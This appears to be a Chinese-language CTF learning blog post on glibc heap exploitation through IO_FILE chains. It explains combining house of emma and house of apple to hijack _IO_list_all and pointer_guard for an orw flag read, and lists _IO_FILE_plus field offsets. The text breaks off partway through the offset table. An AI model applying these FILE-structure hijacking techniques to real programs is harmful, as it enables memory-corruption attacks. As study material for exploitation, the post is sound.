<!DOCTYPE html>
<html lang="zh-CN">

  <head>
    <!-- General meta -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    

    
      <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>heap的IO链学习 | Liyck的技术博客</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="heap的IO链学习" />
<meta name="author" content="Liyck" />
<meta property="og:locale" content="zh_CN" />
<meta name="description" content="早早早" />
<meta property="og:description" content="早早早" />
<link rel="canonical" href="https://liyckonline.top/%E6%8A%80%E6%9C%AF/2025/11/23/IOstudy/" />
<meta property="og:url" content="https://liyckonline.top/%E6%8A%80%E6%9C%AF/2025/11/23/IOstudy/" />
<meta property="og:site_name" content="Liyck的技术博客" />
<meta property="og:image" content="https://picsum.photos/2560/600?image=733" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-11-23T10:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://picsum.photos/2560/600?image=733" />
<meta property="twitter:title" content="heap的IO链学习" />
<script type="application/ld+json">
{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://liyckonline.top/%E6%8A%80%E6%9C%AF/2025/11/23/IOstudy/"},"description":"早早早","author":{"@type":"Person","name":"Liyck"},"url":"https://liyckonline.top/%E6%8A%80%E6%9C%AF/2025/11/23/IOstudy/","image":"https://picsum.photos/2560/600?image=733","headline":"heap的IO链学习","dateModified":"2025-11-23T10:00:00+08:00","datePublished":"2025-11-23T10:00:00+08:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

    
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
      
    

    <link rel="manifest" href="/manifest.json">
    <meta name="theme-color" content="#242e2b"/>

    
      <link rel="stylesheet" href="/assets/styles.css">
    

    

    

    
    
        <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;700&family=JetBrains+Mono:wght@400;700&display=swap" />
        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" media="print" onload="this.media='all'" />
    
    <noscript>
        
            <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
        
    </noscript>



    <!-- Overwrite this file with code you want before the closing head tag -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">


  </head>

  <body class="layout-post  heap的io链学习">
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="height: 0; position: absolute">
  <symbol id="codepen" viewBox="0 0 16 16"><path d="M15.988 5.443c-.004-.02-.007-.04-.012-.058l-.01-.033c-.006-.017-.012-.034-.02-.05-.003-.012-.01-.023-.014-.034l-.023-.045-.02-.032-.03-.04-.024-.03c-.01-.013-.022-.026-.034-.038l-.027-.027-.04-.032-.03-.024-.012-.01L8.38.117c-.23-.155-.53-.155-.76 0L.305 4.99.296 5c-.012.007-.022.015-.032.023-.014.01-.027.02-.04.032l-.027.027-.034.037-.024.03-.03.04c-.006.012-.013.022-.02.033l-.023.045-.015.034c-.007.016-.012.033-.018.05l-.01.032c-.005.02-.01.038-.012.058l-.006.03C.002 5.5 0 5.53 0 5.56v4.875c0 .03.002.06.006.09l.007.03c.003.02.006.04.013.058l.01.033c.006.018.01.035.018.05l.015.033c.006.016.014.03.023.047l.02.03c.008.016.018.03.03.042.007.01.014.02.023.03.01.012.02.025.034.036.01.01.018.02.028.026l.04.033.03.023.01.01 7.31 4.876c.116.078.248.117.382.116.134 0 .266-.04.38-.116l7.314-4.875.01-.01c.012-.007.022-.015.032-.023.014-.01.027-.02.04-.032l.027-.027.034-.037.024-.03.03-.04.02-.032.023-.046.015-.033.018-.052.01-.033c.005-.02.01-.038.013-.058 0-.01.003-.02.004-.03.004-.03.006-.06.006-.09V5.564c0-.03-.002-.06-.006-.09l-.007-.03zM8 9.626L5.568 8 8 6.374 10.432 8 8 9.626zM7.312 5.18l-2.98 1.993-2.406-1.61 5.386-3.59v3.206zM3.095 8l-1.72 1.15v-2.3L3.095 8zm1.237.828l2.98 1.993v3.208l-5.386-3.59 2.406-1.61zm4.355 1.993l2.98-1.993 2.407 1.61-5.387 3.59v-3.206zM12.905 8l1.72-1.15v2.3L12.905 8zm-1.237-.827L8.688 5.18V1.97l5.386 3.59-2.406 1.61z" fill-rule="nonzero"/></symbol>
  <symbol id="dribbble" viewBox="0 0 16 16"><path d="M8 16c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm6.747-6.905c-.234-.074-2.115-.635-4.257-.292.894 2.456 1.258 4.456 1.328 4.872 1.533-1.037 2.624-2.68 2.93-4.58zM10.67 14.3c-.102-.6-.5-2.688-1.46-5.18l-.044.014C5.312 10.477 3.93 13.15 3.806 13.4c1.158.905 2.614 1.444 4.194 1.444.947 0 1.85-.194 2.67-.543zm-7.747-1.72c.155-.266 2.03-3.37 5.555-4.51.09-.03.18-.056.27-.08-.173-.39-.36-.778-.555-1.16C4.78 7.85 1.47 7.807 1.17 7.8l-.003.208c0 1.755.665 3.358 1.756 4.57zM1.31 6.61c.307.005 3.122.017 6.318-.832-1.132-2.012-2.353-3.705-2.533-3.952-1.912.902-3.34 2.664-3.784 4.785zM6.4 1.368c.188.253 1.43 1.943 2.548 4 2.43-.91 3.46-2.293 3.582-2.468C11.323 1.827 9.736 1.176 8 1.176c-.55 0-1.087.066-1.6.19zm6.89 2.322c-.145.194-1.29 1.662-3.816 2.694.16.325.31.656.453.99.05.117.1.235.147.352 2.274-.286 4.533.172 4.758.22-.015-1.613-.59-3.094-1.543-4.257z"/></symbol>
  <symbol id="designernews" viewBox="0 0 16 16"><path d="M7.514 7.988c0-2.555-1.57-4.287-4.56-4.287H0v8.6h3.016c2.903 0 4.498-1.75 4.498-4.31zM5.37 8c0 1.844-.946 2.642-2.467 2.642H2.13V5.358h.773C4.36 5.358 5.37 6.193 5.37 8zM16 12.3V3.7h-1.98v4.81L10.853 3.7h-2.07v8.6h1.982V7.152l3.39 5.146H16z"/></symbol>
  <symbol id="facebook" viewBox="0 0 16 16"><path d="M15.117 0H.883C.395 0 0 .395 0 .883v14.234c0 .488.395.883.883.883h7.663V9.804H6.46V7.39h2.086V5.607c0-2.066 1.262-3.19 3.106-3.19.883 0 1.642.064 1.863.094v2.16h-1.28c-1 0-1.195.476-1.195 1.176v1.54h2.39l-.31 2.416h-2.08V16h4.077c.488 0 .883-.395.883-.883V.883C16 .395 15.605 0 15.117 0" fill-rule="nonzero"/></symbol>
  <symbol id="flickr" viewBox="0 0 16 16"><path d="M0 8c0 2.05 1.662 3.71 3.71 3.71 2.05 0 3.713-1.66 3.713-3.71S5.76 4.29 3.71 4.29C1.663 4.29 0 5.95 0 8zm8.577 0c0 2.05 1.662 3.71 3.712 3.71C14.337 11.71 16 10.05 16 8s-1.662-3.71-3.71-3.71c-2.05 0-3.713 1.66-3.713 3.71z"/></symbol>
  <symbol id="github" viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.582 0 8c0 3.535 2.292 6.533 5.47 7.59.4.075.547-.172.547-.385 0-.19-.007-.693-.01-1.36-2.226.483-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.725-.496.056-.486.056-.486.803.056 1.225.824 1.225.824.714 1.223 1.873.87 2.33.665.072-.517.278-.87.507-1.07-1.777-.2-3.644-.888-3.644-3.953 0-.873.31-1.587.823-2.147-.083-.202-.358-1.015.077-2.117 0 0 .672-.215 2.2.82.638-.178 1.323-.266 2.003-.27.68.004 1.364.092 2.003.27 1.527-1.035 2.198-.82 2.198-.82.437 1.102.163 1.915.08 2.117.513.56.823 1.274.823 2.147 0 3.073-1.87 3.75-3.653 3.947.287.246.543.735.543 1.48 0 1.07-.01 1.933-.01 2.195 0 .215.144.463.55.385C13.71 14.53 16 11.534 16 8c0-4.418-3.582-8-8-8"/></symbol>
  <symbol id="hackernews" viewBox="0 0 16 16"><path d="M0 0v16h16V0H0zm8.92 8.96v3H7.25v-3l-2.75-5h1.96l1.66 3.48L9.7 3.96h1.88l-2.66 5z"/></symbol>
  <symbol id="instagram" viewBox="0 0 16 16"><path d="M8 0C5.827 0 5.555.01 4.702.048 3.85.088 3.27.222 2.76.42c-.526.204-.973.478-1.417.923-.445.444-.72.89-.923 1.417-.198.51-.333 1.09-.372 1.942C.008 5.555 0 5.827 0 8s.01 2.445.048 3.298c.04.852.174 1.433.372 1.942.204.526.478.973.923 1.417.444.445.89.72 1.417.923.51.198 1.09.333 1.942.372.853.04 1.125.048 3.298.048s2.445-.01 3.298-.048c.852-.04 1.433-.174 1.942-.372.526-.204.973-.478 1.417-.923.445-.444.72-.89.923-1.417.198-.51.333-1.09.372-1.942.04-.853.048-1.125.048-3.298s-.01-2.445-.048-3.298c-.04-.852-.174-1.433-.372-1.942-.204-.526-.478-.973-.923-1.417-.444-.445-.89-.72-1.417-.923-.51-.198-1.09-.333-1.942-.372C10.445.008 10.173 0 8 0zm0 1.44c2.136 0 2.39.01 3.233.048.78.036 1.203.166 1.485.276.374.145.64.318.92.598.28.28.453.546.598.92.11.282.24.705.276 1.485.038.844.047 1.097.047 3.233s-.01 2.39-.048 3.233c-.036.78-.166 1.203-.276 1.485-.145.374-.318.64-.598.92-.28.28-.546.453-.92.598-.282.11-.705.24-1.485.276-.844.038-1.097.047-3.233.047s-2.39-.01-3.233-.048c-.78-.036-1.203-.166-1.485-.276-.374-.145-.64-.318-.92-.598-.28-.28-.453-.546-.598-.92-.11-.282-.24-.705-.276-1.485C1.45 10.39 1.44 10.136 1.44 8s.01-2.39.048-3.233c.036-.78.166-1.203.276-1.485.145-.374.318-.64.598-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276C5.61 1.45 5.864 1.44 8 1.44zm0 2.452c-2.27 0-4.108 1.84-4.108 4.108 0 2.27 1.84 4.108 4.108 4.108 2.27 0 4.108-1.84 4.108-4.108 0-2.27-1.84-4.108-4.108-4.108zm0 6.775c-1.473 0-2.667-1.194-2.667-2.667 0-1.473 1.194-2.667 2.667-2.667 1.473 0 2.667 1.194 2.667 2.667 0 1.473-1.194 2.667-2.667 2.667zm5.23-6.937c0 .53-.43.96-.96.96s-.96-.43-.96-.96.43-.96.96-.96.96.43.96.96z"/></symbol>
  <symbol id="linkedin" viewBox="0 0 16 16"><path d="M13.632 13.635h-2.37V9.922c0-.886-.018-2.025-1.234-2.025-1.235 0-1.424.964-1.424 1.96v3.778h-2.37V6H8.51V7.04h.03c.318-.6 1.092-1.233 2.247-1.233 2.4 0 2.845 1.58 2.845 3.637v4.188zM3.558 4.955c-.762 0-1.376-.617-1.376-1.377 0-.758.614-1.375 1.376-1.375.76 0 1.376.617 1.376 1.375 0 .76-.617 1.377-1.376 1.377zm1.188 8.68H2.37V6h2.376v7.635zM14.816 0H1.18C.528 0 0 .516 0 1.153v13.694C0 15.484.528 16 1.18 16h13.635c.652 0 1.185-.516 1.185-1.153V1.153C16 .516 15.467 0 14.815 0z" fill-rule="nonzero"/></symbol>
  <symbol id="medium" viewBox="0 0 16 16"><path d="M11.824 12.628l-.276.45.798.398 2.744 1.372c.15.076.294.11.418.11.278 0 .467-.177.467-.492V5.883l-4.15 6.745zm4.096-8.67c-.004-.003 0-.01-.003-.012l-4.825-2.412c-.06-.03-.123-.038-.187-.044-.016 0-.03-.01-.047-.01-.184 0-.368.092-.467.254l-.24.39-.5.814-1.89 3.08 1.89 3.076.5.813.5.812.59.95 4.71-7.64c.02-.03.01-.06-.02-.08zm-6.27 7.045L7.17 6.97l-.295-.477-.294-.477-.25-.416v4.867l3.32 1.663.5.25.5.25-.5-.813-.5-.813zM.737 1.68L.59 1.608c-.085-.042-.166-.062-.24-.062-.206 0-.35.16-.35.427v10.162c0 .272.2.594.442.716l4.145 2.08c.107.06.208.08.3.08.257 0 .438-.2.438-.53V4.01c0-.02-.012-.04-.03-.047L.738 1.68z"/></symbol>
  <symbol id="pinterest" viewBox="0 0 16 16"><path d="M8 0C3.582 0 0 3.582 0 8c0 3.39 2.108 6.285 5.084 7.45-.07-.633-.133-1.604.028-2.295.146-.625.938-3.977.938-3.977s-.24-.48-.24-1.188c0-1.11.646-1.943 1.448-1.943.683 0 1.012.513 1.012 1.127 0 .687-.436 1.713-.662 2.664-.19.797.4 1.445 1.185 1.445 1.42 0 2.514-1.498 2.514-3.662 0-1.915-1.376-3.254-3.342-3.254-2.276 0-3.61 1.707-3.61 3.472 0 .687.263 1.424.593 1.825.066.08.075.15.057.23-.06.252-.196.796-.223.907-.035.146-.115.178-.268.107-.998-.465-1.624-1.926-1.624-3.1 0-2.524 1.834-4.84 5.287-4.84 2.774 0 4.932 1.977 4.932 4.62 0 2.757-1.74 4.977-4.153 4.977-.81 0-1.572-.422-1.833-.92l-.5 1.902c-.18.695-.667 1.566-.994 2.097.75.232 1.545.357 2.37.357 4.417 0 8-3.582 8-8s-3.583-8-8-8z" fill-rule="nonzero"/></symbol>
  <symbol id="rss" viewBox="0 0 16 16"><path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194 11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.985 2.194-2.196 2.194C.984 16 0 15.017 0 13.806c0-1.21.983-2.195 2.194-2.195zM10.606 16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"/></symbol>
  <symbol id="reddit" viewBox="0 0 16 16"><path d="M1.473 9.368c-.04.185-.06.374-.06.566 0 2.3 2.94 4.173 6.554 4.173 3.613 0 6.553-1.872 6.553-4.173 0-.183-.02-.364-.055-.54l-.01-.022c-.013-.036-.02-.073-.02-.11-.2-.784-.745-1.497-1.533-2.072-.03-.01-.058-.026-.084-.047-.017-.013-.03-.028-.044-.043-1.198-.824-2.91-1.34-4.807-1.34-1.88 0-3.576.506-4.772 1.315-.01.012-.02.023-.033.033-.026.022-.056.04-.087.05-.805.576-1.364 1.293-1.572 2.086 0 .038-.01.077-.025.114l-.005.01zM8 13.003c-1.198 0-2.042-.26-2.58-.8-.116-.116-.116-.305 0-.422.117-.11.307-.11.424 0 .42.42 1.125.63 2.155.63 1.03 0 1.73-.2 2.15-.62.11-.11.3-.11.42 0 .11.12.11.31 0 .43-.54.54-1.38.8-2.58.8zM5.592 7.945c-.61 0-1.12.51-1.12 1.12 0 .608.51 1.102 1.12 1.102.61 0 1.103-.494 1.103-1.102 0-.61-.494-1.12-1.103-1.12zm4.83 0c-.61 0-1.12.51-1.12 1.12 0 .608.51 1.102 1.12 1.102.61 0 1.103-.494 1.103-1.102 0-.61-.494-1.12-1.103-1.12zM13.46 6.88c.693.556 1.202 1.216 1.462 1.94.3-.225.48-.578.48-.968 0-.67-.545-1.214-1.214-1.214-.267 0-.52.087-.728.243zM1.812 6.64c-.67 0-1.214.545-1.214 1.214 0 .363.16.7.43.927.268-.72.782-1.37 1.478-1.92-.202-.14-.443-.22-.694-.22zm6.155 8.067c-3.944 0-7.152-2.14-7.152-4.77 0-.183.016-.363.046-.54-.53-.33-.86-.91-.86-1.545 0-1 .82-1.812 1.82-1.812.45 0 .87.164 1.2.455 1.24-.796 2.91-1.297 4.75-1.33l1.21-3.69.27.063s.01 0 .01.002l2.82.663c.23-.533.76-.908 1.38-.908.82 0 1.49.67 1.49 1.492 0 .823-.67 1.492-1.49 1.492s-1.49-.67-1.49-1.49L9.4 2.18l-.98 2.99c1.77.07 3.37.57 4.57 1.35.33-.31.764-.48 1.225-.48 1 0 1.814.81 1.814 1.81 0 .66-.36 1.26-.92 1.58.02.17.04.33.04.5-.01 2.63-3.21 4.77-7.16 4.77zM13.43 1.893c-.494 0-.895.4-.895.894 0 .493.4.894.894.894.49 0 .89-.4.89-.89s-.4-.89-.9-.89z"/></symbol>
  <symbol id="skype" viewBox="0 0 16 16"><path d="M8.035 12.6c-2.685 0-3.885-1.322-3.885-2.313 0-.51.374-.865.89-.865 1.15 0 .85 1.653 2.995 1.653 1.096 0 1.703-.597 1.703-1.208 0-.368-.18-.775-.904-.954l-2.387-.597C4.524 7.833 4.175 6.79 4.175 5.812c0-2.034 1.91-2.798 3.704-2.798 1.65 0 3.6.916 3.6 2.136 0 .523-.452.827-.97.827-.98 0-.798-1.36-2.773-1.36-.98 0-1.523.444-1.523 1.08 0 .636.774.84 1.446.993l1.767.392c1.936.433 2.427 1.566 2.427 2.633 0 1.652-1.266 2.886-3.82 2.886m7.4-3.264l-.014.084-.028-.16c.015.024.028.05.042.076.082-.45.125-.912.125-1.373 0-1.023-.2-2.014-.595-2.948-.38-.902-.925-1.712-1.62-2.407-.692-.696-1.5-1.242-2.4-1.623C10.015.59 9.025.39 8.005.39c-.48 0-.963.045-1.43.135H6.57l.08.04-.16-.023.08-.016C5.927.183 5.205 0 4.472 0 3.278 0 2.155.466 1.31 1.313.465 2.16 0 3.286 0 4.483c0 .763.195 1.512.563 2.175l.013-.083.028.16c-.015-.026-.027-.052-.04-.077-.076.43-.115.867-.115 1.305 0 1.022.2 2.014.593 2.948.38.903.925 1.713 1.62 2.408.693.695 1.5 1.242 2.4 1.623.932.397 1.92.597 2.94.597.445 0 .89-.04 1.325-.118l-.077-.043.162.028-.084.014c.67.378 1.426.58 2.2.58 1.194 0 2.317-.466 3.162-1.313.845-.846 1.31-1.972 1.31-3.17 0-.765-.197-1.517-.566-2.18" fill-rule="nonzero"/></symbol>
  <symbol id="tumblr" viewBox="0 0 16 16"><path d="M9.708 16c-3.396 0-4.687-2.504-4.687-4.274V6.498H3.403V4.432C5.83 3.557 6.412 1.368 6.55.12c.01-.086.077-.12.115-.12H9.01v4.076h3.2v2.422H8.997v4.98c.01.667.25 1.58 1.472 1.58h.067c.424-.012.994-.136 1.29-.278l.77 2.283c-.288.424-1.594.916-2.77.936h-.12z" fill-rule="nonzero"/></symbol>
  <symbol id="twitch" viewBox="0 0 16 16"><g fill-rule="nonzero"><path d="M1.393 0L.35 2.783v11.13h3.824V16h2.088l2.085-2.088h3.13L15.65 9.74V0H1.394zm1.39 1.39H14.26v7.653l-2.435 2.435H8l-2.085 2.085v-2.085H2.783V1.39z"/><path d="M6.61 8.348H8V4.175H6.61v4.173zm3.824 0h1.39V4.175h-1.39v4.173z"/></g></symbol>
  <symbol id="twitter" viewBox="0 0 16 16"><path d="M16 3.038c-.59.26-1.22.437-1.885.517.677-.407 1.198-1.05 1.443-1.816-.634.375-1.337.648-2.085.795-.598-.638-1.45-1.036-2.396-1.036-1.812 0-3.282 1.468-3.282 3.28 0 .258.03.51.085.75C5.152 5.39 2.733 4.084 1.114 2.1.83 2.583.67 3.147.67 3.75c0 1.14.58 2.143 1.46 2.732-.538-.017-1.045-.165-1.487-.41v.04c0 1.59 1.13 2.918 2.633 3.22-.276.074-.566.114-.865.114-.21 0-.416-.02-.617-.058.418 1.304 1.63 2.253 3.067 2.28-1.124.88-2.54 1.404-4.077 1.404-.265 0-.526-.015-.783-.045 1.453.93 3.178 1.474 5.032 1.474 6.038 0 9.34-5 9.34-9.338 0-.143-.004-.284-.01-.425.64-.463 1.198-1.04 1.638-1.7z" fill-rule="nonzero"/></symbol>
  <symbol id="vimeo" viewBox="0 0 16 16"><path d="M15.992 4.275c-.07 1.56-1.16 3.697-3.263 6.41-2.176 2.832-4.017 4.248-5.522 4.248-.933 0-1.722-.862-2.367-2.588L3.55 7.6c-.48-1.724-.993-2.587-1.542-2.587-.12 0-.538.252-1.255.755L0 4.796C.79 4.1 1.568 3.406 2.335 2.71c1.053-.912 1.844-1.39 2.37-1.44 1.246-.12 2.012.733 2.3 2.56.31 1.97.526 3.194.647 3.673.36 1.634.754 2.45 1.185 2.45.335 0 .838-.53 1.51-1.59.67-1.06 1.028-1.866 1.076-2.42.096-.915-.263-1.374-1.077-1.374-.383 0-.778.087-1.185.262.788-2.58 2.29-3.834 4.508-3.762 1.644.048 2.42 1.116 2.324 3.205z" fill-rule="nonzero"/></symbol>
  <symbol id="youtube" viewBox="0 0 16 16"><path d="M0 7.345c0-1.294.16-2.59.16-2.59s.156-1.1.636-1.587c.608-.637 1.408-.617 1.764-.684C3.84 2.36 8 2.324 8 2.324s3.362.004 5.6.166c.314.038.996.04 1.604.678.48.486.636 1.588.636 1.588S16 6.05 16 7.346v1.258c0 1.296-.16 2.59-.16 2.59s-.156 1.102-.636 1.588c-.608.638-1.29.64-1.604.678-2.238.162-5.6.166-5.6.166s-4.16-.037-5.44-.16c-.356-.067-1.156-.047-1.764-.684-.48-.487-.636-1.587-.636-1.587S0 9.9 0 8.605v-1.26zm6.348 2.73V5.58l4.323 2.255-4.32 2.24h-.002z"/></symbol>
  <symbol id="link" viewBox="0 0 16 16"><path d="M5.86 12.7l-.81.8c-.7.7-1.84.7-2.54 0a1.75 1.75 0 0 1 0-2.5l2.98-2.96c.61-.61 1.77-1.52 2.62-.68a1 1 0 1 0 1.4-1.4c-1.44-1.43-3.57-1.17-5.42.67L1.1 9.6a3.72 3.72 0 0 0 0 5.32 3.78 3.78 0 0 0 5.34 0l.8-.8a1 1 0 1 0-1.39-1.42zm9.03-11.5c-1.55-1.53-3.7-1.6-5.14-.19l-1 1a1 1 0 1 0 1.39 1.41l1-1c.75-.74 1.72-.43 2.35.2a1.75 1.75 0 0 1 0 2.5l-3.17 3.15c-1.46 1.45-2.14.77-2.43.48a1 1 0 0 0-1.4 1.4c.67.67 1.43 1 2.23 1 .98 0 2.01-.5 3-1.47l3.17-3.15a3.72 3.72 0 0 0 0-5.32z"/></symbol>
  <symbol id="email" viewBox="0 0 16 11"><path fill-rule="evenodd" d="M1.33 0h13.34L8 5 1.33 0zM16 0v11H0V0l8 6 8-6z"/></symbol>
  <symbol id="nav" viewBox="0 0 16 11"><path d="M0 12h16v-2H0v2zm0-5h16V5H0v2zm0-7v2h16V0H0z"/></symbol>
</svg>


    <header class="header">
  <div class="container">
    

    
<nav class="nav  nav--header">
  <ul class="list  list--nav">
    

      

      <li class="item  item--nav">
        <a href="/">首页</a>
      </li>
    

      

      <li class="item  item--nav">
        <a href="/blog/">博客</a>
      </li>
    

      

      <li class="item  item--nav">
        <a href="/categories/">分类</a>
      </li>
    

      

      <li class="item  item--nav">
        <a href="/projects/">项目</a>
      </li>
    

      

      <li class="item  item--nav">
        <a href="/about/">关于</a>
      </li>
    

      

      <li class="item  item--nav">
        <a href="/search/">搜索</a>
      </li>
    
  </ul>
  <button class="button  button--nav" aria-label="Menu toggle">
    <svg width="16" height="16" class="icon  icon--nav" role="img" alt="Menu"><title>Menu</title><use xlink:href="#nav" fill="CurrentColor"></use></svg>

  </button>
</nav>


<script type="text/javascript">
  // Get list and button
  const navList = document.querySelector('.header .list--nav')
  const button  = document.querySelector('.header .button--nav')

  // Hide nav and apply toggle
  const collapseNav = () => {
    if (document.body.clientWidth < 640) {
      navList.style.setProperty('--listHeight', `-${navList.offsetHeight}px`)
    } else {
      navList.removeAttribute('style')
    }

    button.onclick = () => {
      navList.style.setProperty('transition', `margin .1s`)
      if (navList.style.getPropertyValue('--listHeight')) {
        navList.style.removeProperty('--listHeight')
      } else {
        navList.style.setProperty('--listHeight', `-${navList.offsetHeight}px`)
      }
    }
  }

  collapseNav()

  // Check on resize if to collapse nav
  window.addEventListener('resize', () => {
    collapseNav()
  })
</script>

  </div>

  




  <div class="feature" style="background-image: url(https://picsum.photos/2560/600?image=733)">
    <div class="container  typeset">
      <h2 id="liyck">Liyck</h2>
<p>“路漫漫其修远兮，吾将上下而求索”</p>

    </div>
  </div>



</header>


<main class="main  container">

  <article class="article  article--post  content  typeset">

    <h1>heap的IO链学习</h1>
    

<small class="small  post-meta">
  
  
    
      <span class="label  label--category"><a href="/categories/#技术">技术</a></span>
    
  &nbsp;&middot;&nbsp;<time datetime="2025-11-23T10:00:00+08:00" class="time">2025年11月23日</time>
</small>

    <h2 id="house-of-apple学习">house of apple学习</h2>

<p><strong>该题目大佬利用了house of emma和house of apple的组合攻击，最终实现了orw读取flag，在这里主要困难的点在于这里的edit也就修改chunk中的步骤只能一次，所以没办法直接利用house of emma（因为house of emma需要两次large bin attack，首先攻击pointer_guard将其修改为已知内容，第二攻击是攻击_IO_list_all，将其进行挟持到堆上，这样就可以控制FIFE的结构，实现最终的攻击效果），因此由于本题只能一次修改，没办法构成两次写，所以想到利用house of apple 可以实现pointer_guard进行覆盖为一个已知的值，这样在利用chain的值指向之后伪造的第二个file结构，对于这个结构可以实现house of emma的攻击方式，最终实现orw攻击</strong></p>

<h4 id="查io链fpchain">查io链fpchain</h4>

<h4 id="house-of-apple">house of apple</h4>

<p>house of apple的攻击原理，简单来说就是利用了_IO_wstrn_overflow这个函数，通过利用file的结构，这个函数可以覆盖传入fp-&gt;_wide_data上的地址覆盖为可以知道的堆地址，攻击效果和进行一次large bin attack一样，实现任意地址写已知地址。</p>

<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nf">exit</span><span class="p">()</span><span class="o">/</span><span class="nf">fcloseall</span><span class="p">()</span>
  <span class="k">-&gt;</span> <span class="nf">_IO_cleanup</span><span class="p">()</span>
    <span class="k">-&gt;</span> <span class="nf">_IO_flush_all_lockp</span><span class="p">()</span>
      <span class="k">-&gt;</span> <span class="n">对</span> <span class="n">_IO_list_all</span> <span class="n">链表里每个</span> <span class="nb">FILE</span> <span class="n">调用</span> <span class="n">vtable</span><span class="k">-&gt;</span><span class="n">_overflow</span><span class="err">（</span><span class="n">或其它</span> <span class="n">vtable</span> <span class="n">函数</span><span class="err">）</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>_IO_FILE_plus结构体偏移</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="n">amd64</span><span class="err">：</span>
 
<span class="mh">0x0</span><span class="o">:</span><span class="err">'</span><span class="n">_flags</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x8</span><span class="o">:</span><span class="err">'</span><span class="n">_IO_read_ptr</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x10</span><span class="o">:</span><span class="err">'</span><span class="n">_IO_read_end</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x18</span><span class="o">:</span><span class="err">'</span><span class="n">_IO_read_base</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x20</span><span class="o">:</span><span class="err">'</span><span class="n">_IO_write_base</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x28</span><span class="o">:</span><span class="err">'</span><span class="n">_IO_write_ptr</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x30</span><span class="o">:</span><span class="err">'</span><span class="n">_IO_write_end</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x38</span><span class="o">:</span><span class="err">'</span><span class="n">_IO_buf_base</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x40</span><span class="o">:</span><span class="err">'</span><span class="n">_IO_buf_end</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x48</span><span class="o">:</span><span class="err">'</span><span class="n">_IO_save_base</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x50</span><span class="o">:</span><span class="err">'</span><span class="n">_IO_backup_base</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x58</span><span class="o">:</span><span class="err">'</span><span class="n">_IO_save_end</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x60</span><span class="o">:</span><span class="err">'</span><span class="n">_markers</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x68</span><span class="o">:</span><span class="err">'</span><span class="n">_chain</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x70</span><span class="o">:</span><span class="err">'</span><span class="n">_fileno</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x74</span><span class="o">:</span><span class="err">'</span><span class="n">_flags2</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x78</span><span class="o">:</span><span class="err">'</span><span class="n">_old_offset</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x80</span><span class="o">:</span><span class="err">'</span><span class="n">_cur_column</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x82</span><span class="o">:</span><span class="err">'</span><span class="n">_vtable_offset</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x83</span><span class="o">:</span><span class="err">'</span><span class="n">_shortbuf</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x88</span><span class="o">:</span><span class="err">'</span><span class="n">_lock</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x90</span><span class="o">:</span><span class="err">'</span><span class="n">_offset</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0x98</span><span class="o">:</span><span class="err">'</span><span class="n">_codecvt</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0xa0</span><span class="o">:</span><span class="err">'</span><span class="n">_wide_data</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0xa8</span><span class="o">:</span><span class="err">'</span><span class="n">_freeres_list</span><span class="err">'</span><span class="p">,</span>
